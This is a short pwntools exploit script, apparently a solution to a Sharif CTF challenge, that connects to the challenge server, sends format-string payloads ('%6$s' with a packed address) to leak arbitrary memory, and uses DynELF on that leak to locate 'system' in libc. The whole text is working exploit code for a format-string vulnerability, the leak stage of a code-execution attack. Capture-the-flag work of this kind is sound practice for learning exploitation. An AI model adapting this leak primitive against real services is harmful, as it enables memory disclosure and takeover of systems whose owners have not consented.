from pwn import *

r = remote('ctf.sharif.edu', 54518)
def go(fsb, delim='~end'):
	r.sendline(fsb)
	print `fsb`
	r.recvuntil('bytes\n')
	return r.recvuntil(delim, drop=True)

def leak(target):
	data = go('%6$s~end' + p32(target)) + '\x00'
	print `data`
	return data

d = DynELF(leak, 0x8048000)
d.lookup('system', 'libc')
